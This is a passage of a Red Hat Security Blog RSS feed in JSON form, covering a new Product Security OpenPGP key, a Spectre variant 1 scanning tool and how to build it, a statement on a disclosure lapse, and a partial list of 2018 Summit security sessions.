{"?xml":{"@version":"1.0","@encoding":"utf-8"},"rss":{"@version":"2.0","@xml:base":"https://access.redhat.com/blogs/766093/posts","@xmlns:dc":"http://purl.org/dc/elements/1.1/","@xmlns:atom":"http://www.w3.org/2005/Atom","@xmlns:og":"http://ogp.me/ns#","@xmlns:content":"http://purl.org/rss/1.0/modules/content/","@xmlns:foaf":"http://xmlns.com/foaf/0.1/","@xmlns:rdfs":"http://www.w3.org/2000/01/rdf-schema#","@xmlns:sioc":"http://rdfs.org/sioc/ns#","@xmlns:sioct":"http://rdfs.org/sioc/types#","@xmlns:skos":"http://www.w3.org/2004/02/skos/core#","@xmlns:xsd":"http://www.w3.org/2001/XMLSchema#","channel":{"server-time":"Sun, 19 Nov 23 05:11:36 +0000","title":"Red Hat Security Blog Blog Posts","link":"https://access.redhat.com/blogs/766093/posts","description":"These blog posts are a part of the Red Hat Security Blog.","language":"en","atom:link":{"@href":"https://access.redhat.com/blogs/766093/feed","@rel":"self","@type":"application/rss+xml"},"item":[{"title":"The Product Security Blog has moved!","link":"https://access.redhat.com/blogs/766093/posts/3997001","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>Red Hat Product Security has joined forces with other security teams inside Red Hat to publish our content in a common venue using the <a href=\"https://www.redhat.com/en/blog/channel/security\">Security channel of the Red Hat Blog</a>.  This move provides a wider variety of important Security topics, from experts all over Red Hat, in a more modern and functional interface.  We hope everyone will enjoy the new experience!</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-3997001\"></div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    security</div>","pubDate":"Tue, 19 Mar 2019 19:38:17 +0000","dc:creator":"Fabio Olive Leite","guid":{"@isPermaLink":"false","#text":"3997001 at https://access.redhat.com"}},{"title":"New Red Hat Product Security OpenPGP key","link":"https://access.redhat.com/blogs/766093/posts/3486851","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>Red Hat Product Security has transitioned from using its old 1024-bit DSA OpenPGP key to a new 4096-bit RSA OpenPGP key.  This was done to improve the long-term security of our communications with our customers and also to meet current key recommendations from NIST (NIST SP 800-57 Pt. 1 Rev. 4 and NIST SP 800-131A Rev. 1).</p>\n<p>The old key will continue to be valid for some time, but it is preferred that all future correspondence use the new key.  Replies and new messages either signed or encrypted by Product Security will use this new key.</p>\n<p>The old key was:</p>\n<pre><code>pub   1024D/0x5E548083650D5882 2001-11-21\n      Key fingerprint = 92732337E5AD3417526564AB5E548083650D5882\n</code></pre><p>And the new key is:</p>\n<pre><code>pub   4096R/0xDCE3823597F5EAC4 2017-10-31\n      Key fingerprint = 77E79ABE93673533ED09EBE2DCE3823597F5EAC4\n</code></pre><p>To fetch the full key from a public key server, you can simply do:</p>\n<pre><code>$ gpg --keyserver keys.fedoraproject.org --recv-key \\\n    '77E79ABE93673533ED09EBE2DCE3823597F5EAC4'\n</code></pre><p>If you already know the old key, you can now verify that the new key is<br />\nsigned by the old one:</p>\n<pre><code>$ gpg --check-sigs '77E79ABE93673533ED09EBE2DCE3823597F5EAC4'\n</code></pre><p>You may also import the public key as listed here:</p>\n<pre><code>-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: GnuPG v2.0.22 (GNU/Linux)\n\nmQINBFn41kMBEACpJL82mKFBTnr4RyCsEseKhMrKaytD19woOwlGSlwFGFsdLKLw\n1jtI2ETqjmIIkZ5uNMB0n9xb1h6azgTZdjADGLRjLcMInxGjw/0wlvhXOlXdea/G\nKlj0YXikdpgINUiMTb5Pyir7K6YQPI27nVk5KTAx3rCA9js7/Br71F+V++PuPud1\nwEJ16SbLitdpOHHGtXj3SdldwHDSPEA5PdgKNZDb4cvj9JXw4IRHgayj9SJ/1us8\n7SDkAodjbg6axaKo8LmiRFGgjRydrm47sqi2k7ZlimtsDp2QxWJoZVmyLX3AOcZl\ne2PxdlzM/h/CGZnzK8WgF54Mtp2xLvn+dn4W9SPJgrLofP07cFrPRi8xtWDAzR1g\nUqsZbmnla5qJuWP5rCkQzmxrazkzv5mpZ7FnGKsypRV0To6Qr6IPD6k/xU9KiiiN\n65WBowoct2Zy6nxStkE3KIBb/98u6vKTUjZ0z4M566rBCpsLabR8gcLY6ObxKYmB\nN2FR5aif6mdEzfrew2rgxTwcCBh7r8QI7LqgYjmQvXw9aCyHgScu+c0aFtW3p3Ro\nIa5Q8F7t9dbZlHVGO1hO8/uiHpA7xOu0Db6XhYrUY7Zqw7QiKBDF6yEjOgwcqpcT\nzV26C3/GzDx74jK5lp6cRPAaQATFpZRjL/tWubM9XCTLtLF9zU1rzf0uPwARAQAB\ntDZSZWQgSGF0LCBJbmMuIChQcm9kdWN0IFNlY3VyaXR5KSA8c2VjYWxlcnRAcmVk\naGF0LmNvbT6JAjcEEwECACEFAln41kMCGwMGCwkIBwMCBhUIAgkKCwMWAgECHgEC\nF4AACgkQ3OOCNZf16sSxiw/+I//qjbUaV1rXfg7PDiDA6/SdfSnPoutxk5Gbm//o\nF/NZaJKh7+EgeDhDsFVnIH70YH6mgCHSVpBDHdLMQ7YvfRdeZeZciCqqnOe76A5o\n7mraOEODh/y/W5sa9O3eG9YzEqReahqaFXe3r/JpaZ/C+o5mjqzsfb1WFCv/KC3j\nMhgfi7LJ2EpGcGlQ/e42i939SF0KrEG0B89EI+XF6utWJpQX+XSi9RPTq1+YrJnp\nxhnA93A5C0XZ7H3xW86qguUEYGHuRV6Jfqllh0n3VNKQde5Bik1wHbvrpoGCiO9C\nGz9zVT62RoH22cAZhUQ6hyN5itGe51mBuUdfsLeY0BYt9mA6hhZPUWlAynYMqkn1\n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\n=Yp+7\n-----END PGP PUBLIC KEY BLOCK-----\n</code></pre><p>If you are satisfied that you've got the right key, and the UIDs match what you expect, you may import and begin using the new key when communicating with us at secalert@redhat com.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-3486851\"></div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div>","pubDate":"Wed, 22 Aug 2018 13:30:00 +0000","dc:creator":"Red Hat Product Security","guid":{"@isPermaLink":"false","#text":"3486851 at https://access.redhat.com"}},{"title":"SPECTRE Variant 1 scanning tool","link":"https://access.redhat.com/blogs/766093/posts/3510331","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>As part of Red Hat's commitment to product security we have developed a tool internally that can be used to scan for <a href=\"https://access.redhat.com/security/vulnerabilities/speculativeexecution\">variant 1 SPECTRE vulnerabilities</a>. As part of our commitment to the wider user community, we are introducing this tool via this article.</p>\n<p>This tool is not a Red Hat product. As such, it is not supported and does not come with any kind of warranty.</p>\n<p>The tool only works on static binaries and does not simulate an entire running system. This means it will neither follow jumps through a PLT into a shared library, nor will it emulate the loading of extra code via the dlopen() function.</p>\n<p>The tool currently only supports the x86_64 and AArch64 architectures.  We do hope to add additional architectures in the future.</p>\n<p>The tool is currently available in source form as it would be unwise to offer a security analysis tool as a pre-compiled binary.  There are details on how to obtain the source and build the tool later in this article.</p>\n<h2>Running</h2>\n<p>To use the scanner simply invoke it with the path to a binary to scan and a starting address inside the binary:</p>\n<pre><code>x86_64-scanner vmlinux --start-address=0xffffffff81700001\n</code></pre><p>Note - these examples are using the x86_64 scanner, but the AArch64 scanner behaves in the same way.</p>\n<p>The start address will presumably be a syscall entry point, and the binary a kernel image. (Uncompressed; the scanner does not yet know how to decompress compressed kernels). Alternatively the binary could be a library and the address an external function entry point into that library. In fact, the scanner will handle any kind of binary, including user programs, libraries, modules, plugins and so on.</p>\n<p>A start address is needed in order to keep things simple and to avoid extraneous output. In theory, the scanner could examine every possible code path through a binary, including ones not normally accessible to an attacker. But this would produce too much output. Instead, a single start address is used in order to restrict the search to a smaller region.  Naturally the scanner can be run multiple times with different starting addresses each time, so that all valid points of attack can be scanned.</p>\n<p>The output of the scanner will probably look like this:</p>\n<pre><code>X86 Scanner: No sequences found.\n</code></pre><p>Or, if something is found, like this:</p>\n<pre><code>X86 Scanner: Possible sequence found, based on a starting address of 0:.\nX86 Scanner:               000000: nop.\nX86 Scanner: COND: 000001: jne &amp;0xe .\nX86 Scanner:               00000e: jne &amp;0x24 .\nX86 Scanner: LOAD:  000010: mov 0xb0(%rdi),%rcx.\nX86 Scanner:               000017: mov 0xb0(%rsp),%rax.\nX86 Scanner:               00001f: nop.\nX86 Scanner: LOAD:  000020: mov 0x30(%rcx),%rbx.\n</code></pre><p>This indicates that entering the test binary at address 0x0 can lead to encountering a conditional jump at address 0x1 would trigger speculation. Then a load at address 0x10 uses an attacker provided value (in %rdi) which might influence a second load at 0x20.</p>\n<p>One important point to remember about the scanner’s output is that it is only a starting point for further investigation.  Closer examination of the code flagged may reveal that an attacker could not actually use it to exploit the Spectre vulnerability.</p>\n<p>Note - currently the scanner does not check that the starting address is actually a valid instruction address. (It does check that the address lies inside the binary image provided). So if an invalid address is provided unexpected errors can be generated.</p>\n<p>Note - the scanner sources include two test files, one for x86_64 (x86_64_test.S) and one for AArch64 (aarch64_test.S). These can be used to test the functionality of the scanner.</p>\n<h2>How It Works</h2>\n<p>The scanner is basically a simulator that emulates the execution of the instructions from the start address until the code reaches a return instruction which would return to whatever called the start address. It tracks values in registers and memory (including the stack, data sections, and the heap).</p>\n<p>Whenever a conditional branch is encountered the scanner splits itself and follows both sides of the branch. This is repeated at every encounter, subject to an upper limit set by the <code>--max-num-branches</code> option.</p>\n<p>The scanner assumes that at the start address only the stack and those registers which are used for parameter passing could contain attacker provided values. This helps prevent false positive results involving registers that could not have been compromised by an attacker.</p>\n<p>The scanner keeps a record of the instructions encountered and which of them might trigger speculation and which might be used to load values from restricted memory, so that it can report back when it finds a possible vulnerability.</p>\n<p>The scanner also knows about the speculation denial instructions (lfence, pause, csdb), and it will stop a scan whenever it encounters one of them.</p>\n<p>The scanner has a built-in limit on the total number of instructions that it will simulate on any given path. This is so that it does not get stuck in infinite loops. Currently the limit is set at 4096 instructions.</p>\n<h3>Options</h3>\n<p>The scanner does support a --verbose option which makes it tell you more about what it is doing. If this option is repeated then it will tell even more, possibly too much. The <code>--quiet</code> option on the other hand disables most output, (unless there is an internal error), although the tool does still return a zero or non-zero exit value depending upon whether any vulnerabilities were found.</p>\n<p>There is also a <code>--max-num-branches</code> option which will restrict the scanner to following no more than the specified number of conditional branches. The default is 32, so this option can be used to increase or decrease the amount of scanning performed by the tool.</p>\n<p>By default the scanner assumes that the file being examined is in the ELF file format. But the <code>--binary</code> option overrides this and causes the input to be treated as a raw binary file. In this format the address of the first byte in the file is considered to be zero, the second byte is at address 1 and so on.</p>\n<p>The x86_64 scanner uses Intel syntax in its disassembly output by default but you can change this with the <code>--syntax=att</code> option.</p>\n<h2>Building</h2>\n<p>The <a href=\"https://people.redhat.com/~nickc/Spectre_Scanner/scanner.tar.xz\">source for the scanner</a> is available for download.  In order to build the scanner from the source you will also need a copy of the <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fftp.gnu.org%2Fgnu%2Fbinutils%2F\">FSF binutils source</a>.</p>\n<p>Note - it is not sufficient to just install the binutils package or the binutils-devel package, as the scanner uses header files that are internal to the binutils sources. This requirement is an artifact of how the scanner evolved and it will be removed one day.</p>\n<p>Note - you do not need to build a binutils release from these sources. But if you do not then you will need to install the binutils and binutils-devel packages on your system. This is so that the binutils libraries are available for linking the scanner. In theory it should not matter if you have different versions of the binutils sources and binutils packages installed, as the scanner only makes use of very basic functions in the binutils library. Ones that do not change between released versions.</p>\n<p>Edit the makefile and select the version of the scanner that you want to build (AArch64 or x86_64). Also edit the CFLAGS variable to point to the binutils sources.</p>\n<p>If you are building the AArch64 version of the tool you will also need a copy of the <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fftp.gnu.org%2Fgnu%2Fgdb%2F\">GDB sources</a> from which you will need to build the AArch64 simulator:</p>\n<pre><code>./configure --target=aarch64-elf\nmake all-sim\n</code></pre><p>Then edit the makefile and change the AARCH64 variables to point to the built sim.  To build the scanner once these edits are complete just run \"make\".</p>\n<h2>Feedback</h2>\n<p>Feedback on problems building or running the scanner are very much welcome. Please send them to <a href=\"mailto:nickc@redhat.com\">Nick Clifton</a>.  We hope that you find this tool useful.</p>\n<p>Red Hat is also very interested in collaborating with any party that is concerned about this vulnerability. If you would like to pursue this, please contact <a href=\"mailto:jcm@redhat.com\">Jon Masters</a>.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-3510331\"></div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div>","pubDate":"Wed, 18 Jul 2018 13:30:00 +0000","dc:creator":"Nick Clifton","guid":{"@isPermaLink":"false","#text":"3510331 at https://access.redhat.com"}},{"title":"Red Hat’s disclosure process","link":"https://access.redhat.com/blogs/766093/posts/3525631","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>Last week, a vulnerability (<a href=\"https://access.redhat.com/security/cve/cve-2018-10892\">CVE-2018-10892</a>) that affected CRI-O, Buildah, Podman, and Docker was made public before some affected upstream projects were notified. We regret that this was not handled in a way that lives up to our own standards around responsible disclosure. It has caused us to look back to see what went wrong so as to prevent this from happening in the future.</p>\n<p>Because of how important our relationships with the community and industry partners are and how seriously we treat non-public information irrespective of where it originates, we are taking this event as an opportunity to look internally at improvements and challenge assumptions we have held.</p>\n<p>We conducted a review and are using this to develop training around the handling of non-public information relating to security vulnerabilities, and ensuring that our relevant associates have a full understanding of the importance of engaging with upstreams as per their, and our, responsible disclosure guidelines. We are also clarifying communication mechanisms so that our associates are aware of the importance of and methods for notifying upstream of a vulnerability prior to public disclosure.</p>\n<p>Red Hat values and recognizes the importance of relationships, be they with upstreams, downstreams, industry partners and peers, customers, or vulnerability reporters. We embrace open source development principles including trust and transparency. As we navigate through a landscape full of software that will inevitably contain security vulnerabilities we strive to manage each flaw with the same degree of care and attention, regardless of its potential impact. Our commitment is to work with other vendors of Linux and open source software to reduce the risk of security issues through responsible information sharing and peer reviews.</p>\n<p>This event has reminded us that it is important to remain vigilant, provide consistent, clear guidance, and handle potentially sensitive information appropriately. And while our track record of responsible disclosure speaks for itself, when an opportunity presents itself to revisit, reflect, and improve our processes, we make the most of it to ensure we have the proper procedures and controls in place.</p>\n<p>Red Hat takes its participation in open source projects and security disclosure very seriously. We have discovered hundreds of vulnerabilities and our dedicated Product Security team has participated in responsible disclosures for more than 15 years. We strive to get it right every time, but this time we didn't quite live up to the standards to which we seek to hold ourselves. Because we believe in open source principles such as accountability, we wanted to share what had happened and how we have responded to it. We are sincerely apologetic for not meeting our own standards in this instance.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-3525631\"></div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    security</div>","pubDate":"Tue, 10 Jul 2018 13:00:00 +0000","dc:creator":"Vincent Danen","guid":{"@isPermaLink":"false","#text":"3525631 at https://access.redhat.com"}},{"title":"Join us in San Francisco at the 2018 Red Hat Summit","link":"https://access.redhat.com/blogs/766093/posts/3418921","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>This year’s Red Hat Summit will be held on May 8-10 in beautiful San Francisco, USA.  Product Security will be joining many Red Hat security experts in presenting and assisting subscribers and partners at the show.  Here is a sneak peek at the more than 125 sessions that a security-minded attendee can see at Summit this year.</p>\n<h2>Sessions</h2>\n<h3>Cloud Management and Automation</h3>\n<p><a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153868\">S1181 - Automating security and compliance for hybrid environments</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154283\">S1467 - Live demonstration: Find it. Fix it. Before it breaks.</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153698\">S1104 - Distributed API Management in a Hybrid Cloud Environment</a></p>\n<h3>Containers and Openshift</h3>\n<p><a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153589\">S1049 - Best practices for securing the container life cycle</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153993\">S1260 - Hitachi &amp; Red Hat collaborate: container migration guide</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153928\">S1220 - Network Security for Apps on OpenShift</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153935\">S1225 - OpenShift for Operations</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154760\">S1778 - Security oriented OpenShift within regulated environments</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154627\">S1689 - Automating Openshift Secure Container Deployment at Experian</a></p>\n<h3>Infrastructure Modernization &amp; Optimization</h3>\n<p><a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154690\">S1727 - Demystifying systemd</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154709\">S1741 - Deploying SELinux successfully in production environments</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154091\">S1329 - Operations Risk Remediation in Highly Secure Infrastructures</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154349\">S1515 - Path to success with your Identity Management deployment</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154980\">S1936 - Red Hat Satellite 6 power user tips and tricks</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154943\">S1907 - Satellite 6 Securing Linux lifecycle in the Public Sector</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154974\">S1931 - Security Enhanced Linux for Mere Mortals</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154033\">S1288 - Smarter Infrastructure Management with Satellite &amp; Insights</a></p>\n<h3>Middleware + Modern App Dev Security</h3>\n<p><a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154928\">S1896 - Red Hat API Management Overview, Security Models and Roadmap</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154883\">S1863 - Red Hat Single Sign-On Present and Future</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154463\">S1045 - Securing Apps &amp; Services with Red Hat Single-Sign On</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=163840\">S2109 - Securing service mesh, micro services and modern applications with JWT</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153883\">S1189 - Mobile in a containers world</a></p>\n<h3>Value of the Red Hat Subscription</h3>\n<p><a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154952\">S1916 - Exploiting Modern Microarchitectures: Meltdown, Spectre, and other hardware security vulnerabilities in modern processors</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=163814\">S2702 - The Value of a Red Hat Subscription</a></p>\n<h3>Roadmaps &amp; From the Office of the CTO</h3>\n<p><a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=163626\">S2502 - Charting new territories with Red Hat</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=160937\">S9973 - Getting strategic about security</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153514\">S1017 - Red Hat Security Roadmap : It's a Lifestyle, Not a Product</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=163829\">S1000 - Red Hat Security Roadmap for Hybrid Cloud</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154920\">S1890 - What's new in security for Red Hat OpenStack Platform?</a></p>\n<h3>Instructor-Led Security Labs</h3>\n<p><a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153510\">L1007, L1007R - A practical introduction to container security (3rd ed.)</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153876\">L1036 - Defend Yourself Using Built-in RHEL Security Technologies</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153872\">L1034, L1034R - Implementing Proactive Security and Compliance Automation</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154118\">L1051 - Linux Container Internals: Part 1</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154119\">L1052     - Linux Container Internals: Part 2</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153594\">L1019 - OpenShift + RHSSO = happy security teams and happy users</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154746\">L1106, L1106R - Practical OpenSCAP</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154140\">L1055 - Up and Running with Red Hat Identity Management</a></p>\n<h3>Security Mini-Topic Sessions</h3>\n<p><a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153617\">M1022 - A problem's not a problem, until it's a problem (Red Hat Insights)</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154511\">M1140 - Blockchain: How to identify good use cases</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=154036\">M1087 - Monitor and automate infrastructure risk in 15 minutes or less</a></p>\n<h3>Security Birds-of-a-Feather Sessions</h3>\n<p><a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153696\">B1009 - Connecting the Power of Data Security and Privacy</a><br />\n<a href=\"https://agenda.summit.redhat.com/SessionDetail.aspx?id=153795\">B1990 - Grafeas to gate your deployment pipeline</a><br />\n<a 